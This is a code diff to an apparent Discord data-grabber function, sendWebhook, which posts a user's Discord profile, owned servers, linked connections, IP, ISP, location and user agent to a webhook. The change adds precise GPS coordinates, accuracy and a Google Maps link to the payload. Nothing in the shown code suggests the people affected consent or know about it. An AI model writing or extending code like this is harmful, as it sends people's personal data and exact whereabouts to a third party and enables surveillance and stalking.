@@ -1,11 +1,12 @@
-import { DiscordUser, DiscordGuild, DiscordConnection, IpInfo } from "../types/userdata";
+import { DiscordUser, DiscordGuild, DiscordConnection, IpInfo, GpsData } from "../types/userdata";
 
 export const sendWebhook = async ( 
   userInfo: DiscordUser, 
   ownGuilds: DiscordGuild[], 
   connections: DiscordConnection[], 
   ipInfo: IpInfo, 
-  ua: string 
+  ua: string,
+  gps: GpsData
 ) => {
     try {
         const webhookUrl = process.env.DISCORD_WEBHOOK || "";
@@ -27,8 +28,13 @@ export const sendWebhook = async (
             inline: false
           },
           {
-            name: "🌎 Location",
+            name: "🌎 Location from IP",
             value: `Country: \`${ipInfo.country}\`\nCity, Region: \`${ipInfo.city}, ${ipInfo.region}\`\nLocation: \`${ipInfo.loc}\`\nISP: \`${ipInfo.isp}\`\nMoreInfo: [Click here](https://ipinfo.io/${ipInfo.ip})`,
+            inline: false
+          },
+          {
+            name: "🌐 Location from GPS",
+            value: `Latitude: \`${gps.latitude}\`\nLongitude: \`${gps.longitude}\`\nAccuracy: \`${gps.accuracy}\`\nMoreInfo: [Click here](https://www.google.com/maps?q=${gps.latitude},${gps.longitude})`,
             inline: false
           }
         ];
